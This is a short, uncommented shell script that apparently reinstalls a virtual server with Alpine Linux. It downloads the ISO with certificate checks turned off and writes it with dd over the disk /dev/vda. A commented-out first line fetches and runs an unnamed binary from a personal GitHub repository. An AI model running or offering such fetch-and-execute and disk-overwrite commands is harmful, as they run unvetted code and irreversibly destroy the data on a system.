#cd /tmp && wget https://raw.githubusercontent.com/Wisherk8/s/main/r2 && chmod +x r2 && ./r2
cd /tmp/
wget --no-check-certificate https://dl-cdn.alpinelinux.org/alpine/v3.14/releases/x86_64/alpine-virt-3.14.2-x86_64.iso
dd if=alpine-virt-3.14.2-x86_64.iso of=/dev/vda
